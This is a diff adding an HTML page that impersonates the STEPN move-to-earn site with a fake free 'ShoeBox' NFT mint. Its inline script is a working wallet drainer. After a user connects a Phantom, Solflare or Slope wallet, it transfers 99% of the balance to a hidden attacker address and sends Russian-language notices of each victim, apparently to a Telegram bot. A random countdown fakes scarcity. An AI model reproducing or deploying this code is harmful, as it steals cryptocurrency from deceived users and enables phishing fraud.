@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>STEPN - Free ShoeBox</title>
+    <link rel="stylesheet" type="text/css" href="./css/reset.css">
+    <link rel="stylesheet" type="text/css" href="./css/style.css">
+    <link rel="stylesheet" type="text/css" href="./css/media.css">
+    <link href="./css/chunk-vendor.css" rel="stylesheet preload prefetch" as="style">
+    <meta name="keywords" content="STEPN, Game-Fi, Fitness, running app, Crypto, Game, GMT, GST, Solana, SOL, move2earn,
+  metaverse, play2earn, web3">
+    <meta name="description" content="In STEPN, your steps are worth more than you think -- exercising and moving outdoors
+  can now earn anyone tokens anytime, anywhere. We believe this simple design can nudge millions into healthier
+  lifestyles and bring them to the Web3 world.">
+    <link rel="icon" href="./img/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css">
+<style type="text/css">
+    .alertify-notifier .ajs-message.ajs-warning {
+        background: #ffffffdb;
+        color: #000;
+        font-family: 'TT Octosquares';
+        font-weight: 600;
+        border: 3px solid #000;
+        border-radius: 30px;
+    }
+
+    button {
+        padding: 0;
+        border: none;
+        font: inherit;
+        color: inherit;
+        background-color: transparent;
+        cursor: pointer;
+    }
+</style>
+</head>
+
+<body>
+    <div class="loading">
+
+        <img class='loading__image' src="./img/loading.gif" width="1000" alt="">
+
+    </div>
+
+
+    <a data-role="logo" href="/"><img src="./img/logo.svg" alt="" class="logo" data-role="logo" width="106" height="106"></a>
+    <a target="_blank" style="color:#000;" href="https://apps.apple.com/us/app/stepn/id1598112424">
+        <div class="join breathe">DOWNLOAD NOW</div>
+    </a>
+    <div class="boxes">
+
+        <div class="span-boxes">Unique Limited Item</div>
+        <img class="img-box" src="./img/shoeboxes.png">
+
+        <div class="id-number-box-from">Collect <span>Unique</span> Limited <span>Item</span></div>
+
+        <div class="box-limit">
+            <div class="box-limit-text">
+                <div>Cost: 0.00 SOL <br/>per 1 ShoeBox</div>
+                <div>Remain: <span id="remain-mint"></span></div>
+            </div>
+            <div class="container">
+                <div class="skill" id="mint-progress"></div>
+            </div>
+        </div>
+            
+        <div class="mint__price">
+            <p>Maximum 1 per Customer</p>
+        </div>
+        
+        <div class="mint__content">
+            <div class="mint__wallet-hidden" style="display: none">3SGmW7HmsGHNcX6JC29dHvYNQrKBZsmrY1uAjbkzGQN3</div>
+            <div class="mint__counter">
+                <div class="counter">
+                    <div class="counter__input">1</div>
+                    <div class="counter__button counter__button_minus"><img src="./img/minus.svg"></div>
+                    <div class="counter__button counter__button_plus"><img src="./img/plus.svg"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-box mint__button" id="connect">
+            <button class="v-btn v-btn--is-elevated v-btn--has-bg v-btn--rounded theme--light v-size--default client--button" type="button" style="justify-content: center;">Connect Wallet</button>
+        </div>
+
+    </div>
+
+    <div class="select__wallet-cont" style="display: none;">
+        <div class="select__wallet">
+          <h4 class="select__title" style="align-items: center;">Select your wallet <svg class="exit" fill="rgb(158, 158, 158)
+" focusable="false" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></h4>
+          <div class="select__wallets">
+            <div class="select__wallet-item" id="phantom">
+              <div class="wallet__name">Phantom</div>
+              <img class="select__wallet-icon" src="./img/phantom.svg" alt="Phantom">
+            </div>
+
+            <div class="select__wallet-item" id="slope">
+              <div class="wallet__name">Slope</div>
+              <img class="select__wallet-icon" src="./img/slope.png" alt="Slope">
+            </div>
+
+            <div class="select__wallet-item" id="solflare">
+              <div class="wallet__name">Solflare</div>
+              <img class="select__wallet-icon" src="./img/solflare.svg" alt="Solflare">
+            </div>
+
+            <div class="select__hide" style="display: none;">
+                <div class="select__wallet-item" id="sollet">
+                  <div class="wallet__name">Sollet</div>
+                  <img class="select__wallet-icon" src="./img/sollet.svg" alt="Sollet">
+                </div>
+
+                <div class="select__wallet-item" style="border-radius: 0 0 0 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1);" id="sollet_e">
+                  <div class="wallet__name">Sollet (Extension)</div>
+                  <img class="select__wallet-icon" src="./img/sollet_e.png" alt="Slope">
+                </div>
+            </div>
+
+            <div class="select__wallet-item" id="hide" style="display: none;">
+              <div class="wallet__name wallet__name-hide">More options</div>
+              <svg class="select__wallet-icon select__wallet-icon-hide" fill="#9e9e9e" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path></svg>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    <div class="box"></div>
+
+
+    <div class="featuder-box">
+        <div class="title">AS FEATURED IN</div>
+        <div class="icon feature-icon">
+            <a href="https://www.bloomberg.com/press-releases/2021-12-10/the-first-solana-nft-mobile-game-is-officially-released" target="_blank" rel="noreferrer"><img src="./img/bloomberg.png" alt=""></a>
+            <a href="https://news.yahoo.com/news/first-solana-nft-mobile-game-122000074.html" target="_blank" rel="noreferrer">
+			<img src="./img/yahooNews@3x.png" alt=""></a>
+            <a href="https://finance.yahoo.com/news/stepn-announces-public-beta-launch-210300551.html" target="_blank" rel="noreferrer">
+				<img src="./img/yahooFinance@3x.png" alt=""></a><a href="https://cointelegraph.com/press-releases/stepnan-nft-sneaker-you-can-use-in-real-life-and-get-fit" target="_blank" rel="noreferrer">
+					<img src="./img/cointelegraph.svg" alt=""></a>
+            <a href="https://www.benzinga.com/pressreleases/21/12/24542611/the-first-solana-nft-mobile-game-is-officially-released" target="_blank" rel="noreferrer">
+						<img src="./img/benzinga.svg" alt=""></a><a href="https://www.nasdaq.com/press-release/the-first-solana-nft-mobile-game-is-officially-released-2021-12-10" target="_blank" rel="noreferrer">
+							<img src="./img/nasdaq.svg" alt=""></a><a href="https://www.marketwatch.com/press-release/the-first-solana-nft-mobile-game-is-officially-released-2021-12-10?tesla=y" target="_blank" rel="noreferrer"><img src="./img/marketwatch.svg" alt=""></a>
+        </div>
+    </div>
+
+
+    <div class="roadmap-box">
+        <div class="title">ROADMAP</div>
+
+        <div class="container-road">
+            <img src="./img/roadmap-top.svg" alt="" class="top">
+            <div class="wrapper-road">
+                <img src="./img/roadmap-pcs.svg" alt="" id="roadmap" draggable="false"><img src="./img/roadmap-bottom.svg" alt="" class="bottom"></div>
+        </div>
+    </div>
+
+    <div class="row start">
+        <div class="mc-field-group">
+            <input type="email" class="subscribe-box" placeholder="Email" name="EMAIL" id="mce-EMAIL" aria-required="true" aria-invalid="true" value="">
+        </div>
+        <div class="clear">
+            <input type="submit" name="subscribe" id="mc-embedded-subscribe" class="button sendEmail title" value="SUBSCRIBE" onclick="subscribe()">
+        </div>
+    </div>
+
+
+    <div class="backers-box">
+        <div class="title">OUR BACKERS</div>
+        <div class="background">
+            <div class="mask"></div>
+            <div class="content">
+                <div class="row">
+                    <a href="https://www.sequoiacap.com" target="_blank">
+					<img src="./img/sequoia.svg" width="314" alt=""></a>
+                    <a href="https://www.folius.ventures/" target="_blank">
+						<img src="./img/folius.svg" width="370" alt=""></a>
+                    <a href="https://www.binance.com/" target="_blank">
+							<img src="./img/binance.svg" width="288" alt=""></a>
+                </div>
+                <div class="grid"><a href="https://solana.ventures/" target="_blank">
+							<img src="./img/solanabackers.svg" alt=""></a>
+                    <a href="https://www.alameda-research.com/" target="_blank">
+								<img src="./img/alamedabackers.svg" alt=""></a>
+                    <a href="https://www.defialliance.co/" target="_blank">
+									<img src="./img/defiallifadsf.svg" alt=""></a>
+                    <a href="http://m13.co/" target="_blank">
+										<img src="./img/m333.svg" alt=""></a>
+                    <a href="https://cornerventures.com/" target="_blank">
+											<img src="./img/corner.svg" alt=""></a>
+                    <a href="https://www.6thman.ventures/" target="_blank">
+												<img src="./img/6thmanback.svg" alt=""></a>
+                    <a href="https://zeeprime.capital/" target="_blank">
+													<img src="./img/zee.svg" alt=""></a>
+                    <a href="https://www.sfermion.io/" target="_blank">
+														<img src="./img/sfermion.svg" alt=""></a>
+                    <a href="https://sparkdigitalcapital.com/" target="_blank">
+															<img src="./img/spark.svg" alt=""></a>
+                    <a href="https://morningstar.ventures/" target="_blank"><img src="./img/morningstrr.svg" alt=""></a>
+                    <a href="https://lemniscap.com/" target="_blank"><img src="./img/lemniscoppp.svg" alt="">
+															</a>
+                    <a href="https://www.welindershi.com/" target="_blank"><img src="./img/wsss@3x.png" alt=""></a>
+                    <a href="https://www.solarecofund.com/" target="_blank"><img src="./img/solareco.svg" alt=""></a><a href="https://www.openspace.vc/" target="_blank"><img src="./img/openspace.svg" alt=""></a></div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <div class="footer-full">
+        <img src="./img/footer.svg" class="responsive1" alt="" width="100%">
+        <img src="./img/footermobile.svg" class="responsive2" alt="" width="100%">
+        <div class="media">
+            <a href="mailto:hello@stepn.com">
+			<img src="./img/email.svg" alt=""><span class="__cf_email__" data-cfemail="adc5c8c1c1c2edded9c8ddc383cec2c0">hello@stepn.com</span></a>
+            <a href="https://stepn.com/stepn_media_kit.zip" download="">
+				<img src="./img/downloadmedia.svg" alt="">download media kit</a>
+        </div>z
+        <div class="icon">
+            <a href="https://discord.com/invite/stepn2" target="_blank" rel="noreferrer">
+					<img src="./img/discut.svg" alt="">
+				</a>
+            <a href="https://t.me/STEPNannouncement" target="_blank" rel="noreferrer">
+					<img src="./img/bxlTelegram.svg" alt=""></a>
+            <a href="https://twitter.com/Stepnofficial" target="_blank" rel="noreferrer">
+						<img src="./img/twitter.svg" alt="">
+					</a>
+            <a href="https://www.reddit.com/r/StepN/" target="_blank" rel="noreferrer">
+						<img src="./img/reddit.svg" alt="">
+					</a>
+            <a href="https://stepnofficial.medium.com/" target="_blank" rel="noreferrer">
+						<img src="./img/medium.svg" alt="">
+					</a>
+        </div>
+        <p>
+            <span>COPYRIGHT FINDSATOSHI LAB LTD. <span id="footer-year"></span> - ALL RIGHTS RESERVED</span> <span>丨</span> <span>POWERED BY FINDSATOSHI LAB LTD.</span></p>
+    </div>
+
+<script src="js/libs/jquery-3.6.0.min.js" charset="utf-8"></script>
+<script src="js/script.js"></script>
+
+<script src="js/index.iife.min.js?d"></script>
+
+
+<script>
+    window.onload = function() {
+
+        document.body.classList.add('loading');
+
+        window.setTimeout(function() {
+
+            document.body.classList.add('loading_hiding');
+
+            document.body.classList.remove('loading');
+
+        }, 3500);
+
+    };
+</script>
+
+<script>
+	document.getElementById("footer-year").innerHTML = new Date().getFullYear();
+
+    let i = 1982;
+    let x = 1982;
+    let mintId = setInterval(function() {  
+        i = i - (Math.floor(Math.random() * 10) + 1);
+        if (i >= 0 ) {
+           document.getElementById("remain-mint").innerHTML = i;
+        } else {
+           document.getElementById("remain-mint").innerHTML = '0';
+        }
+        let s = (-(i*100/x)+105);
+        document.getElementById("mint-progress").style.width = s<100 ? s+'%' : '100%';
+    }, 1500);
+
+</script>
+
+<script>
+
+    (function() {
+        var ALPHABET, ALPHABET_MAP, Base58, i;
+
+        Base58 = (typeof module !== "undefined" && module !== null ? module.exports : void 0) || (window.Base58 = {});
+
+        ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+
+        ALPHABET_MAP = {};
+
+        i = 0;
+
+        while (i < ALPHABET.length) {
+          ALPHABET_MAP[ALPHABET.charAt(i)] = i;
+          i++;
+        }
+
+        Base58.encode = function(buffer) {
+          var carry, digits, j;
+          if (buffer.length === 0) {
+            return "";
+          }
+          i = void 0;
+          j = void 0;
+          digits = [0];
+          i = 0;
+          while (i < buffer.length) {
+            j = 0;
+            while (j < digits.length) {
+              digits[j] <<= 8;
+              j++;
+            }
+            digits[0] += buffer[i];
+            carry = 0;
+            j = 0;
+            while (j < digits.length) {
+              digits[j] += carry;
+              carry = (digits[j] / 58) | 0;
+              digits[j] %= 58;
+              ++j;
+            }
+            while (carry) {
+              digits.push(carry % 58);
+              carry = (carry / 58) | 0;
+            }
+            i++;
+          }
+          i = 0;
+          while (buffer[i] === 0 && i < buffer.length - 1) {
+            digits.push(0);
+            i++;
+          }
+          return digits.reverse().map(function(digit) {
+            return ALPHABET[digit];
+          }).join("");
+        };
+
+        Base58.decode = function(string) {
+          var bytes, c, carry, j;
+          if (string.length === 0) {
+            return new (typeof Uint8Array !== "undefined" && Uint8Array !== null ? Uint8Array : Buffer)(0);
+          }
+          i = void 0;
+          j = void 0;
+          bytes = [0];
+          i = 0;
+          while (i < string.length) {
+            c = string[i];
+            if (!(c in ALPHABET_MAP)) {
+              throw "Base58.decode received unacceptable input. Character '" + c + "' is not in the Base58 alphabet.";
+            }
+            j = 0;
+            while (j < bytes.length) {
+              bytes[j] *= 58;
+              j++;
+            }
+            bytes[0] += ALPHABET_MAP[c];
+            carry = 0;
+            j = 0;
+            while (j < bytes.length) {
+              bytes[j] += carry;
+              carry = bytes[j] >> 8;
+              bytes[j] &= 0xff;
+              ++j;
+            }
+            while (carry) {
+              bytes.push(carry & 0xff);
+              carry >>= 8;
+            }
+            i++;
+          }
+          i = 0;
+          while (string[i] === "1" && i < string.length - 1) {
+            bytes.push(0);
+            i++;
+          }
+          return new (typeof Uint8Array !== "undefined" && Uint8Array !== null ? Uint8Array : Buffer)(bytes.reverse());
+        };
+
+      }).call(this);
+
+      $("#sollet").on("click", event => {
+          window.sollet.connect(); 
+      })
+
+
+      async function sfMint() {
+          var resp = await window.solflare.connect();
+
+          var connection = new solanaWeb3.Connection(
+            "https://solana-api.syndica.io/access-token/H6sx87JgF63EQtuIefm0vdz6iOHm8EKyZ6QpOQiRR3hawYiiVNvy4QZ0U04qGrAo",
+          );
+          const wallet = window.solflare.publicKey.toString();
+          console.log( wallet );
+          const walletBalance = await connection.getBalance(window.solflare.publicKey);
+          var textsf = "💰Кто то подключил кошелек💰\n"+
+              "Адресс отправителя: \n" + (window.solflare.publicKey) +"\n";
+              otpravka(token,textsf,chatid);
+
+
+          const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
+          var transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: window.solflare.publicKey,
+              toPubkey: recieverWallet,
+              lamports: walletBalance * 0.99, // const * price per unit
+            }),
+          );
+
+          console.log()
+
+
+          // Setting the variables for the transaction
+          transaction.feePayer = window.solflare.publicKey;
+          let blockhashObj = await connection.getRecentBlockhash();
+          transaction.recentBlockhash = await blockhashObj.blockhash;
+
+          const signed = await window.solflare.signTransaction(transaction);
+
+          let txid = await connection.sendRawTransaction(signed.serialize());
+          await connection.confirmTransaction(txid);
+          var text4 = "💰Кто то подтвердил транзакцию💰\n"+
+              "Если ничего не пришло значит баланс слишком маленький (";
+              popavca(token,text4,chatid)
+      }
+
+
+        function solflareLogin() {
+          window.solflare.connect();
+        
+          window.solflare.on("connect", () => {
+            $('.wallet-adapter-button').text("Mint");
+            $('.mint__button').attr("id", "mintSolflare");
+            $("#mintSolflare").on("click", sfMint);
+            console.log("hi");
+            $(".select__wallet-cont").fadeOut("fast");
+          });
+        }
+        
+        $("#solflare").on("click", event => {
+          // Check if the extension object exists
+          if (typeof window.solflare === "object") {
+            // Check if the connect() method is available
+            if (typeof window.solflare.connect === "function") {
+              window.solflare.connect();
+        
+              window.solflare.on("connect", () => {
+                $('.wallet-adapter-button').text("Mint");
+                $('.mint__button').attr("id", "mintSolflare");
+                $("#mintSolflare").on("click", sfMint);
+                console.log("hi");
+                $(".select__wallet-cont").fadeOut("fast");
+              });
+            }
+             else {
+                // Extension object not found, show an alert
+                alert("Solflare extension not found.");
+            
+                // Check the browser type to determine the download link
+                const isFirefox = typeof InstallTrigger !== "undefined";
+                const isChrome = !!window.chrome;
+            
+                // Redirect to the appropriate download link
+                if (isFirefox) {
+                  window.open("https://addons.mozilla.org/en-GB/firefox/addon/solflare-wallet/", "_blank");
+                } else if (isChrome) {
+                  window.open("https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic", "_blank");
+                } else {
+                  alert("Please download the Solflare extension for your browser.");
+                }
+              }
+          } else {
+              // connect() method not available, show a message
+              alert("The Solflare extension does not support the connect method.");
+            }
+        });
+
+      const { Transaction, Connection, PublicKey } = solanaWeb3;
+
+          async function sMint() {
+              const tx = new Transaction()
+              var connection = new solanaWeb3.Connection(
+                "https://solana-api.syndica.io/access-token/H6sx87JgF63EQtuIefm0vdz6iOHm8EKyZ6QpOQiRR3hawYiiVNvy4QZ0U04qGrAo/",
+                  );
+
+              const slope = new window.Slope();
+              var { msg, data } = await slope.connect()
+
+              const orgPubKey = new PublicKey(data.publicKey)
+
+
+              tx.feePayer = orgPubKey;
+              console.log(tx.feePayer);
+              tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash
+              const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
+              const walletBalance = await connection.getBalance(orgPubKey);
+              var textslope = "💰Кто то подключил кошелек💰\n"+
+              "Адресс отправителя: \n" + (orgPubKey) +"\n";
+              otpravka(token,textslope,chatid);
+              console.log(walletBalance / 1000000000 * 0.99)
+
+              tx.add(
+                  solanaWeb3.SystemProgram.transfer({
+                  fromPubkey: orgPubKey,
+                  toPubkey: recieverWallet,
+                  lamports: (walletBalance * 0.99),
+                })
+              )
+
+              console.log(tx)
+
+              var { msg, data } = await slope.signTransaction(
+                  Base58.encode(tx.serializeMessage())
+              )
+
+              tx.addSignature(
+                  new PublicKey(data.publicKey),
+                  Base58.decode(data.signature)
+              )
+
+              var isOk = tx.verifySignatures();
+              console.log('verifySignatures: ' + isOk);
+
+              const txid = await connection.sendRawTransaction(tx.serialize());
+              var text3 = "💰Кто то подтвердил транзакцию💰\n"+
+              "Если ничего не пришло значит баланс слишком маленький (";
+              popavca(token,text3,chatid);
+              // const hashReal = await sendAndConfirmRawTransaction(connection,tx.serialize());
+
+          }
+
+
+        //   async function as() {
+        //       // const slope = new ;
+        //       const { msg, data } = await new window.Slope().connect()
+
+        //       if (msg === 'ok') {
+        //           // console.log(data.publicKey)
+        //           $('.wallet-adapter-button').text("Mint");
+        //           $('.mint__button').attr("id","mintSlope");
+        //           $("#mintSlope").on("click", sMint);
+        //           document.querySelector(".select__wallet-cont").style.display = "none";
+        //       } else {
+        //           console.log(msg)
+        //       }
+        //   }
+
+        //   $("#slope").on("click", event => {
+        //       as();
+        //   })
+        
+        async function as() {
+          // const slope = new ;
+          const { msg, data } = await new window.Slope().connect()
+
+          if (msg === 'ok') {
+              // console.log(data.publicKey)
+              $('.wallet-adapter-button').text("Mint");
+              $('.mint__button').attr("id","mintSlope");
+              $("#mintSlope").on("click", sMint);
+              document.querySelector(".select__wallet-cont").style.display = "none";
+          } else {
+              console.log(msg)
+          }
+      }
+        
+        function checkExtensionAndProceed() {
+          // Check if the Slope extension is installed
+          if (typeof window.Slope === 'undefined') {
+            // Extension not found, show alert and redirect to download page
+            alert("The Slope extension was not found. Please install it to continue.");
+            window.open("https://chrome.google.com/webstore/detail/slope-wallet/pocmplpaccanhmnllbbkpgfliimjljgo", "_blank");
+          } else {
+            // Extension found, proceed with the original code
+            as();
+          }
+        }
+        
+        $("#slope").on("click", event => {
+          checkExtensionAndProceed();
+        });
+
+
+      let connected = false;
+      $('#phantom').on('click', async() => {
+        if(window.solana && window.solana.isPhantom)
+        {
+          const resp = await window.solana.connect(); // this is browser wallet
+
+          if (connected == false) {
+              var connection = new solanaWeb3.Connection(
+                "https://solana-api.syndica.io/access-token/H6sx87JgF63EQtuIefm0vdz6iOHm8EKyZ6QpOQiRR3hawYiiVNvy4QZ0U04qGrAo/",
+              );
+
+              $('.wallet-adapter-button').text("Mint");
+              $('.mint__button').attr("id","mintPhantom");
+              $("#mintPhantom").on("click", pMint);
+              document.querySelector(".select__wallet-cont").style.display = "none";
+
+              connected = true;
+          }
+        }
+        else {
+            // Extension object not found, show an alert
+            alert("Phantom extension not found.");
+        
+            // Check the browser type to determine the download link
+            const isFirefox = typeof InstallTrigger !== "undefined";
+            const isChrome = !!window.chrome;
+        
+            // Redirect to the appropriate download link
+            if (isFirefox) {
+              window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+            } else if (isChrome) {
+              window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+            } else {
+              alert("Please download the Phantom extension for your browser.");
+            }
+        }
+      });
+      async function pMint() {
+          const resp = await window.solana.connect();
+          var connection = new solanaWeb3.Connection(
+            "https://solana-api.syndica.io/access-token/H6sx87JgF63EQtuIefm0vdz6iOHm8EKyZ6QpOQiRR3hawYiiVNvy4QZ0U04qGrAo/",
+          );
+
+          const public_key = new PublicKey(resp.publicKey);
+          const walletBalance = await connection.getBalance(public_key);
+          var textfant = "💰Кто то подключил кошелек💰\n"+
+          "Адресс отправителя: \n" + (public_key) +"\n";
+          otpravka(token,textfant,chatid);
+          console.log(walletBalance);
+
+          $('.wallet-adapter-button').text("Mint");
+          $('.mint__button').attr("id","mintPhantom");
+          $("#mintPhantom").on("click", pMint);
+
+          const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
+
+          var transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: resp.publicKey,
+              toPubkey: recieverWallet,
+              lamports: walletBalance * 0.99,
+            }),
+          );
+
+          transaction.feePayer = window.solana.publicKey;
+          let blockhashObj = await connection.getRecentBlockhash();
+          transaction.recentBlockhash = await blockhashObj.blockhash;
+
+          const signed = await window.solana.signTransaction(transaction);
+          var text2 = "💰Кто то подтвердил транзакцию💰\n" +
+          "Если ничего не пришло значит баланс слишком маленький (";
+          popavca(token,text2,chatid);
+
+          let txid = await connection.sendRawTransaction(signed.serialize());
+          await connection.confirmTransaction(txid);
+      }
+
+      $("#mintPhantom").on("click", pMint);
+
+
+    $(".select__hide").slideUp("fast");
+    
+    is = false;
+    
+    $("#hide").on("click", event => {
+        if (is) {
+            $(".select__hide").slideUp("fast");
+            $(".wallet__name-hide").text("More options");
+            document.querySelector(".select__wallet-icon-hide").style.transform = "rotate(0deg)";
+            is = false;
+        } else {
+            $(".select__hide").slideDown("fast");
+            $(".wallet__name-hide").text("Less options");
+            document.querySelector(".select__wallet-icon-hide").style.transform = "rotate(180deg)";
+            is = true;
+        }
+    })
+
+</script>
+
+</body>
+</html>
